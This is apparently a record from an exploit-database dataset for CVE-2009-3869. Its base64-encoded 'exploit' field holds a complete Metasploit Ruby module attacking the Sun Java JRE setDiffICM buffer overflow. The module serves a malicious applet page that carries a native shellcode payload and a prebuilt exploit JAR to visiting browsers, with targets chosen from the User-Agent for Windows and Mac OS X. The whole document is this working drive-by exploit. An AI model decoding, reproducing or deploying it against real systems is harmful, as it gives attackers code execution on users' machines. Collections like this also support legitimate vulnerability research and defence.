{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgJElkOiBqYXZhX3NldGRpZmZpY21fYm9mLnJiIDEwMzk0IDIwMTAtMDktMjAgMDg6MDY6MjdaIGpkdWNrICQNCiMjDQoNCiMjDQojIFRoaXMgZmlsZSBpcyBwYXJ0IG9mIHRoZSBNZXRhc3Bsb2l0IEZyYW1ld29yayBhbmQgbWF5IGJlIHN1YmplY3QgdG8NCiMgcmVkaXN0cmlidXRpb24gYW5kIGNvbW1lcmNpYWwgcmVzdHJpY3Rpb25zLiBQbGVhc2Ugc2VlIHRoZSBNZXRhc3Bsb2l0DQojIEZyYW1ld29yayB3ZWIgc2l0ZSBmb3IgbW9yZSBpbmZvcm1hdGlvbiBvbiBsaWNlbnNpbmcgYW5kIHRlcm1zIG9mIHVzZS4NCiMgaHR0cDovL21ldGFzcGxvaXQuY29tL2ZyYW1ld29yay8NCiMjDQoNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KCVJhbmsgPSBHcmVhdFJhbmtpbmcNCg0KCSMNCgkjIFRoaXMgbW9kdWxlIGFjdHMgYXMgYW4gSFRUUCBzZXJ2ZXINCgkjDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnU3VuIEphdmEgSlJFIEFXVCBzZXREaWZmSUNNIEJ1ZmZlciBPdmVyZmxvdycsDQoJCQknRGVzY3JpcHRpb24nICAgID0+ICVxew0KCQkJCVRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgZmxhdyBpbiB0aGUgc2V0RGlmZklDTSBmdW5jdGlvbiBpbiB0aGUgU3VuIEpWTS4NCg0KCQkJCVRoZSBwYXlsb2FkIGlzIHNlcmlhbGl6ZWQgYW5kIHBhc3NlZCB0byB0aGUgYXBwbGV0IHZpYSBQQVJBTSB0YWdzLiBJdCBtdXN0IGJlDQoJCQkJYSBuYXRpdmUgcGF5bG9hZC4NCg0KCQkJCVRoZSBlZmZlY3RlZCBKYXZhIHZlcnNpb25zIGFyZSBKREsgYW5kIEpSRSA2IFVwZGF0ZSAxNiBhbmQgZWFybGllciwNCgkJCQlKREsgYW5kIEpSRSA1LjAgVXBkYXRlIDIxIGFuZCBlYXJsaWVyLCBTREsgYW5kIEpSRSAxLjQuMl8yMyBhbmQNCgkJCQllYXJsaWVyLCBhbmQgU0RLIGFuZCBKUkUgMS4zLjFfMjYgYW5kIGVhcmxpZXIuDQoNCgkJCQlOT1RFOiBBbHRob3VnaCBhbGwgb2YgdGhlIGFib3ZlIHZlcnNpb25zIGFyZSByZXBvcnRlZGx5IHZ1bG5lcmFibGUsIG9ubHkNCgkJCQkxLjYuMF91MTEgYW5kIDEuNi4wX3UxNiBvbiBXaW5kb3dzIFhQIFNQMyB3ZXJlIHRlc3RlZC4NCgkJCX0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ0F1dGhvcicgICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJJ2pkdWNrJw0KCQkJCV0sDQoJCQknVmVyc2lvbicgICAgICAgID0+ICckUmV2aXNpb246IDEwMzk0ICQnLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQ1ZFJywgJzIwMDktMzg2OScgXSwNCgkJCQkJWyAnT1NWREInLCAnNTk3MTAnIF0sDQoJCQkJCVsgJ0JJRCcsICczNjg4MScgXSwNCgkJCQkJWyAnVVJMJywgJ2h0dHA6Ly9zdW5zb2x2ZS5zdW4uY29tL3NlYXJjaC9kb2N1bWVudC5kbz9hc3NldGtleT0xLTY2LTI3MDQ3NC0xJyBdLA0KCQkJCQlbICdVUkwnLCAnaHR0cDovL3d3dy56ZXJvZGF5aW5pdGlhdGl2ZS5jb20vYWR2aXNvcmllcy9aREktMDktMDc4LycgXSwNCgkJCQldLA0KCQkJJ1BheWxvYWQnICAgICAgICA9Pg0KCQkJCXsNCgkJCQkJJ1NwYWNlJyAgICA9PiAxMDI0LA0KCQkJCQknQmFkQ2hhcnMnID0+ICcnLA0KCQkJCQknRGlzYWJsZU5vcHMnID0+IHRydWUsDQoJCQkJfSwNCgkJCSdUYXJnZXRzJyAgICAgICAgPT4NCgkJCQlbDQo9YmVnaW4NCg0KTm8gYXV0b21hdGljIHRhcmdldHRpbmcgZm9yIG5vdyAuLi4NCg0KCQkJCQlbICdKMlNFIDEuNl8xNiBBdXRvbWF0aWMnLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gWyd3aW4nLCAnbGludXgnLCAnb3N4J10sDQoJCQkJCQkJJ0FyY2gnID0+IFtBUkNIX1g4NiwgQVJDSF9QUENdDQoJCQkJCQl9DQoJCQkJCV0sDQo9ZW5kDQoJCQkJCVsgJ0oyU0UgMS42XzE2IG9uIFdpbmRvd3MgeDg2JywNCgkJCQkJCXsNCgkJCQkJCQknUGxhdGZvcm0nID0+ICd3aW4nLA0KCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1g4Ng0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdKMlNFIDEuNl8xNiBvbiBNYWMgT1MgWCBQUEMnLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ29zeCcsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfUFBDLA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCQlbICdKMlNFIDEuNl8xNiBvbiBNYWMgT1MgWCB4ODYnLA0KCQkJCQkJew0KCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ29zeCcsDQoJCQkJCQkJJ0FyY2gnID0+IEFSQ0hfWDg2LA0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCV0sDQoJCQknRGVmYXVsdFRhcmdldCcgID0+IDAsDQoJCQknRGlzY2xvc3VyZURhdGUnID0+ICdOb3YgMDQgMjAwOScNCgkJCSkpDQoJZW5kDQoNCg0KCWRlZiBvbl9yZXF1ZXN0X3VyaShjbGksIHJlcSkNCg0KCQkjIENyZWF0ZSBhIGNhY2hlZCBtYXBwaW5nIGJldHdlZW4gSVAgYW5kIGRldGVjdGVkIHRhcmdldA0KCQlAdGFyZ2V0Y2FjaGUgfHw9IHt9DQoJCUB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdIHx8PSB7fQ0KCQlAdGFyZ2V0Y2FjaGVbY2xpLnBlZXJob3N0XVs6dXBkYXRlXSA9IFRpbWUubm93LnRvX2kNCg0KCQlpZiAodGFyZ2V0Lm5hbWUgPX4gL0F1dG9tYXRpYy8pDQoJCQljYXNlIHJlcS5oZWFkZXJzWydVc2VyLUFnZW50J10NCgkJCXdoZW4gL1dpbmRvd3MvaQ0KCQkJCXByaW50X3N0YXR1cygiQ2hvb3NpbmcgYSBXaW5kb3dzIHRhcmdldCBmb3IgI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fS4uLiIpDQoJCQkJQHRhcmdldGNhY2hlW2NsaS5wZWVyaG9zdF1bOnRhcmdldF0gPSBzZWxmLnRhcmdldHNbMV0NCgkJCXdoZW4gL1BQQyBNYWMgT1MgWC9pDQoJCQkJcHJpbnRfc3RhdHVzKCJDaG9vc2luZyBhIE1hYyBPUyBYIFBQQyB0YXJnZXQgZm9yICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KCQkJCUB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdWzp0YXJnZXRdID0gc2VsZi50YXJnZXRzWzJdDQoJCQl3aGVuIC9JbnRlbCBNYWMgT1MgWC9pDQoJCQkJcHJpbnRfc3RhdHVzKCJDaG9vc2luZyBhIE1hYyBPUyBYIHg4NiB0YXJnZXQgZm9yICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KCQkJCUB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdWzp0YXJnZXRdID0gc2VsZi50YXJnZXRzWzNdDQoJCQllbHNlDQoJCQkJcHJpbnRfc3RhdHVzKCJVbmtub3duIHRhcmdldCBmb3I6ICN7cmVxLmhlYWRlcnNbJ1VzZXItQWdlbnQnXX0iKQ0KCQkJZW5kDQoJCWVuZA0KDQoJCSMgQ2xlYW4gdGhlIGNhY2hlDQoJCXJtcSA9IFtdDQoJCUB0YXJnZXRjYWNoZS5lYWNoX2tleSBkbyB8YWRkcnwNCgkJCWlmIChUaW1lLm5vdy50b19pID4gQHRhcmdldGNhY2hlW2FkZHJdWzp1cGRhdGVdKzYwKQ0KCQkJCXJtcS5wdXNoIGFkZHINCgkJCWVuZA0KCQllbmQNCg0KCQlybXEuZWFjaCB7fGFkZHJ8IEB0YXJnZXRjYWNoZS5kZWxldGUoYWRkcikgfQ0KDQoNCgkJIyBSZXF1ZXN0IHByb2Nlc3NpbmcNCgkJaWYgKG5vdCByZXEudXJpLm1hdGNoKC9cLmphciQvaSkpDQoNCgkJCSMgUmVkaXJlY3QgdG8gdGhlIGJhc2UgZGlyZWN0b3J5IHNvIHRoZSBhcHBsZXQgY29kZSBsb2Fkcy4uLg0KCQkJaWYgKG5vdCByZXEudXJpLm1hdGNoKC9cLyQvKSkNCgkJCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgcmVkaXJlY3Qgc28gcGF0aCBlbmRzIHdpdGggLyAuLi4iKQ0KCQkJCXNlbmRfcmVkaXJlY3QoY2xpLCBnZXRfcmVzb3VyY2UoKSArICcvJywgJycpDQoJCQkJcmV0dXJuDQoJCQllbmQNCg0KCQkJIyBEaXNwbGF5IHRoZSBhcHBsZXQgbG9hZGluZyBIVE1MDQoJCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgSFRNTCB0byAje2NsaS5wZWVyaG9zdH06I3tjbGkucGVlcnBvcnR9Li4uIikNCgkJCXNlbmRfcmVzcG9uc2VfaHRtbChjbGksIGdlbmVyYXRlX2h0bWwocGF5bG9hZC5lbmNvZGVkKSwNCgkJCQl7DQoJCQkJCSdDb250ZW50LVR5cGUnID0+ICd0ZXh0L2h0bWwnLA0KCQkJCQknUHJhZ21hJyA9PiAnbm8tY2FjaGUnDQoJCQkJfSkNCgkJCXJldHVybg0KCQllbmQNCg0KCQkjIFNlbmQgdGhlIGFjdHVhbCBhcHBsZXQgb3Zlcg0KCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgYXBwbGV0IHRvICN7Y2xpLnBlZXJob3N0fToje2NsaS5wZWVycG9ydH0uLi4iKQ0KCQlzZW5kX3Jlc3BvbnNlKGNsaSwgZ2VuZXJhdGVfYXBwbGV0KGNsaSwgcmVxKSwNCgkJCXsNCgkJCQknQ29udGVudC1UeXBlJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCgkJCQknUHJhZ21hJyA9PiAnbm8tY2FjaGUnDQoJCQl9KQ0KDQoJCSMgSGFuZGxlIHRoZSBwYXlsb2FkDQoJCWhhbmRsZXIoY2xpKQ0KCWVuZA0KDQoNCglkZWYgZ2VuZXJhdGVfaHRtbChwbCkNCg0KCQlodG1sID0gPDwtRU9GDQo8aHRtbD4NCjxoZWFkPg0KPCEtLSA8bWV0YSBodHRwLWVxdWl2PXJlZnJlc2ggY29udGVudD0xMCAvPiAtLT4NCjwvaGVhZD4NCjxib2R5Pg0KPGFwcGxldCB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJyBjb2RlPSdBcHBsZXRYJyBhcmNoaXZlPSdKQVJOQU1FJz4NCjxwYXJhbSBuYW1lPSdzYycgdmFsdWU9J1NDT0RFJyAvPg0KPHBhcmFtIG5hbWU9J25wJyB2YWx1ZT0nTk9QUycgLz4NCjwvYXBwbGV0Pg0KPC9ib2R5Pg0KPC9odG1sPg0KRU9GDQoJCSMgZmluYWxpemUgaHRtbA0KCQlqYXJfbmFtZSA9IHJhbmRfdGV4dF9hbHBoYW51bWVyaWMoMzIpKyIuamFyIg0KCQlodG1sLmdzdWIhKC9KQVJOQU1FLywgamFyX25hbWUpDQoNCgkJIyBwdXQgcGF5bG9hZCBpbnRvIGh0bWwNCgkJZGVidWdfcGF5bG9hZCA9IGZhbHNlDQoJCXBsb2FkID0gIiINCgkJcGxvYWQgPDwgIlx4Y2MiIGlmIGRlYnVnX3BheWxvYWQNCgkJcGxvYWQgPDwgcGwNCgkJaWYgKChwbG9hZC5sZW5ndGggJSA0KSA+IDApDQoJCQlwbG9hZCA8PCByYW5kX3RleHQoKDQgLSAocGxvYWQubGVuZ3RoICUgNCkpKQ0KCQllbmQNCgkJaWYgZGVidWdfcGF5bG9hZA0KCQkJcHJpbnRfc3RhdHVzKCJwbG9hZCAje3Bsb2FkLmxlbmd0aH0gYnl0ZXM6XG4iICsgUmV4OjpUZXh0LnRvX2hleF9kdW1wKHBsb2FkKSkNCgkJZW5kDQoJCWh0bWwuZ3N1YiEoL1NDT0RFLywgUmV4OjpUZXh0LnRvX2hleChwbG9hZCwgJycpKQ0KDQoJCSMgcHV0IG5vcHMgaW50byBodG1sDQoJCW5vcHMgPSAiXHg5MFx4OTBceDkwXHg5MCINCgkJaHRtbC5nc3ViISgvTk9QUy8sIFJleDo6VGV4dC50b19oZXgobm9wcywgJycpKQ0KCQkjcHJpbnRfc3RhdHVzKCJub3BzICN7bm9wcy5sZW5ndGh9IGJ5dGVzOlxuIiArIFJleDo6VGV4dC50b19oZXhfZHVtcChub3BzKSkNCg0KCQlyZXR1cm4gaHRtbA0KDQoJZW5kDQoNCg0KCWRlZiBleHBsb2l0DQoJCXBhdGggPSBGaWxlLmpvaW4oTXNmOjpDb25maWcuaW5zdGFsbF9yb290LCAiZGF0YSIsICJleHBsb2l0cyIsICJDVkUtMjAwOS0zODY5LmphciIpDQoJCWZkID0gRmlsZS5vcGVuKHBhdGgsICJyYiIpDQoJCUBqYXJfZGF0YSA9IGZkLnJlYWQoZmQuc3RhdC5zaXplKQ0KCQlmZC5jbG9zZQ0KDQoJCXN1cGVyDQoJZW5kDQoNCg0KCWRlZiBnZW5lcmF0ZV9hcHBsZXQoY2xpLCByZXEpDQoNCgkJdGhpc190YXJnZXQgPSBuaWwNCgkJaWYgKHRhcmdldC5uYW1lID1+IC9BdXRvbWF0aWMvKQ0KCQkJaWYgKEB0YXJnZXRjYWNoZVtjbGkucGVlcmhvc3RdWzp0YXJnZXRdKQ0KCQkJCXRoaXNfdGFyZ2V0ID0gQHRhcmdldGNhY2hlW2NsaS5wZWVyaG9zdF1bOnRhcmdldF0NCgkJCWVsc2UNCgkJCQlyZXR1cm4gJycNCgkJCWVuZA0KCQllbHNlDQoJCQl0aGlzX3RhcmdldCA9IHRhcmdldA0KCQllbmQNCg0KCQlyZXR1cm4gQGphcl9kYXRhDQoJZW5kDQoNCmVuZA==", 
    "filename": "platforms/multiple/remote/16298.rb", 
    "id": "16298", 
    "cves": [
        "CVE-2009-3869"
    ]
}